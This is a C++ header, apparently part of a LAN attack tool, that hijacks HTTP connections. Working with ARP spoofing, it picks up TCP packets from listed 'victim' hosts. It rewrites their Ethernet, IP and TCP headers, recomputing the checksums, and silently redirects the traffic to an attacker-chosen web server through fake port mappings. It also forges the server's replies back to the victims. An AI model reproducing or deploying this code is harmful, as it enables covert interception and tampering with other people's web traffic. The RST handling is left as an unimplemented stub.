//
// Created by kenny on 2/11/19.
//

#pragma once

#include "hdrs.h"
#include "pkt.h"
#include "fake-port.h"
#include "arpspf.h"

inline bool operator<(const kni::ipv4_t &a, const kni::ipv4_t &b) {
    return *(uint32_t *) (&a) < *(uint32_t *) (&b);
}

namespace kni {

    struct endpoint_t {
        ipv4_t ip;
        port_t port;
    };

    bool operator<(const endpoint_t &a, const endpoint_t &b) {
        return (a.port < b.port) ||
               (a.port == b.port && *(uint32_t *) (&a.ip) < *(uint32_t *) (&b.ip));
    }

    bool operator==(const endpoint_t &a, const endpoint_t &b) {
        return a.ip == b.ip && a.port == b.port;
    }

    struct conn_pair_t {
        endpoint_t src, dst;
    };

    class hijack_http_base : public io_packet_base, public tcp_packet {
    public:

        hijack_http_base(const lan_info *l, const endpoint_t &remote) :
                io_packet_base(),
                tcp_packet(),
                lan(l), httpd(remote),
                send_buf(new u_char[snap_len]), port_manager(10032, 0x10000, 6 * 60) {
        }

        inline void add_victim(ipv4_t ip) noexcept {
            victims.insert(ip);
        }

#ifndef KNI_DEBUG_TEST_PREVENT_SEND
        protected:
#endif
        inline void send_fake_packet(const endpoint_t &from, const endpoint_t &to) {
            memcpy(send_buf.get(), cap_packet, cap_info.caplen);

            // Modify Ethernet header
            fields_setter set(send_buf.get());
            set(ethHdr.src, lan->map(to_string(from.ip)));
            set(ethHdr.dst, lan->map(to_string(to.ip))).incr(ETHER_HDRLEN);

            // Modify IPv4 header
            set(ipHdr.src, from.ip);
            set(ipHdr.dst, to.ip);
            set(ipHdr.check, 0);    // Zero the checksum
            set(ipHdr.check, ipHdr.cal_checksum(set.from()));

            fields_getter get(set.from());
            // Calculate TCP checksum
            u_char buf[PSEUDO_IPV4_HDRLEN];
            set.change(buf);

            set(pseudo.proto, IPPROTO_TCP);
            set(pseudo.tcp_len, get(ipHdr.tot_len) - get(ipHdr.ihl) * 4);
            set(pseudo.rsv, 0);
            set(pseudo.src, from.ip);
            set(pseudo.dst, to.ip);

            // Modify TCP header
            set.change(send_buf.get() + ETHER_HDRLEN + get(ipHdr.ihl) * 4);
            set(tcpHdr.src, from.port);
            set(tcpHdr.dst, to.port);
            set(tcpHdr.check, 0);   // Zero the checksum
            set(tcpHdr.check, tcpHdr.cal_checksum(set.from(), buf));
#ifndef KNI_DEBUG_TEST_PREVENT_SEND
            if (!send_packet(send_buf.get(), cap_info.caplen))
                KNI_LOG_ERROR("%s", err());
#endif
        }

        /**
         *
         * @param iter an iterator of conn_pairs
         */
        inline void remove_mapping_info(std::map<port_t, conn_pair_t>::const_iterator iter) {
            auto port = iter->first;
            port_manager.free(port);

            auto &src = iter->second.src;
            auto &dst = iter->second.dst;
            KNI_LOG_DEBUG("Port [%d] released from %s:%d -> %s:%d", port, to_string(src.ip).c_str(), src.port,
                          to_string(dst.ip).c_str(), dst.port);

            closed_end.erase(src);
            closed_end.erase(dst);
            fake_ports.erase(iter->second.src);
            conn_pairs.erase(iter);
        }

        /**
         *
         * @param from the endpoint to be marked as closed
         * @param another
         * @return true if another endpoint is already marked as closed
         */
        inline bool set_tcp_fin(const endpoint_t &from, const endpoint_t &another) {
            closed_end.insert(from);
            return closed_end.count(another) == 1;
        }

        inline void send_packet_tcp_rst() {
            // TODO Send TCP RST and return
        }

        /**
         * Filter and forward TCP traffic from victims
         *
         * @param get a fields_getter object to be used on TCP header
         */
        inline void forward_tcp_victim(fields_getter get) {
            auto iter = fake_ports.find(sender);
            port_t port;

            if (iter == fake_ports.end()) {
                if (!(get(tcpHdr.flags) & tcp_header::syn)) {
                    // An endpoint of a victim expects to send a segment after our own timeout
                    KNI_LOG_WARN("Port times out for packet from %s:%d", to_string(sender.ip).c_str(), sender.port);
                    send_packet_tcp_rst();
                    return;
                }
                // TCP SYN
                // Allocate a port number
                port = assign_fake_port();
            } else {
                port = iter->second;
                // TCP FIN or RST
                // Remove port mapping info if both sides agree to close connection
                if (get(tcpHdr.flags) & (tcp_header::fin | tcp_header::rst) && set_tcp_fin(sender, receiver)) // NOLINT
                    remove_mapping_info(conn_pairs.find(port));
                else
                    port_manager.refresh(port);
            }

            send_fake_packet({lan->dev.ip, port}, httpd);
        }

        /**
         * Forward TCP traffic from httpd
         *
         * @param get a fields_getter object to be used on TCP header
         */
        inline void forward_tcp_httpd(fields_getter get) {
            // Retrieve the port mapping info
            auto iter = conn_pairs.find(get(tcpHdr.dst));
            if (iter == conn_pairs.end()) {
                // The original port times out. Drop the packet
                KNI_LOG_WARN("Port times out from \"httpd\" to [%d]. ", get(tcpHdr.dst));
                send_packet_tcp_rst();
                return;
            }

            auto &src = iter->second.dst;
            auto &dst = iter->second.src;

            // TCP SYN or RST
            if (get(tcpHdr.flags) & (tcp_header::fin | tcp_header::rst) &&
                set_tcp_fin(src, dst))  // Connection termination // NOLINT
                remove_mapping_info(iter);
            else
                port_manager.refresh(iter->first);

            send_fake_packet(src, dst);
        }

        /**
         * Allocate a fake port number
         *
         * @return port number
         */
        inline port_t assign_fake_port() {
            auto port = port_manager.alloc();
            auto iter = conn_pairs.find(port);

            if (iter != conn_pairs.end()) {
                // The port was used before and times out now.
                // Erase the associated out-of-time information.
                // This ensures that the outdated port will not be used in an incomplete TCP connection
                KNI_LOG_DEBUG("Port [%d] reused", iter->first);
                remove_mapping_info(iter);
            }

            // This port number can be used
            fake_ports[sender] = port;
            conn_pairs[port] = {sender, receiver};

            KNI_LOG_DEBUG("Port [%d] assigned to %s:%d", port, to_string(sender.ip).c_str(), sender.port);

            return port;
        }


    public:
        void handle_packet() override {
            fields_getter get(cap_packet);
            if (get(ethHdr.type) != ETH_P_IP || get.incr(ETHER_HDRLEN)(ipHdr.proto) != IPPROTO_TCP)
                return;

            auto dst_ip = get(ipHdr.dst);

            // Sender of the TCP segment
            sender = {get(ipHdr.src), get.incr(get(ipHdr.ihl) * 4)(tcpHdr.src)};
            // Receiver of the TCP segment
            receiver = {dst_ip, get(tcpHdr.dst)};

            if (victims.count(sender.ip) == 1 && receiver.port == httpd.port)
                forward_tcp_victim(get);
            else if (sender == httpd)
                forward_tcp_httpd(get);

            sender = receiver = {};     // TODO Necessary to clear data?
        };

#ifdef KNI_DEBUG_TEST_PREVENT_SEND
    public:
#else
        protected:
#endif
        endpoint_t httpd, sender{}, receiver{};

        const lan_info *lan;

        std::set<ipv4_t> victims;

        std::set<endpoint_t> closed_end;
        std::map<endpoint_t, port_t> fake_ports;
        std::map<port_t, conn_pair_t> conn_pairs;

        fake_port_manager port_manager;

        std::unique_ptr<u_char[]> send_buf;
    };

}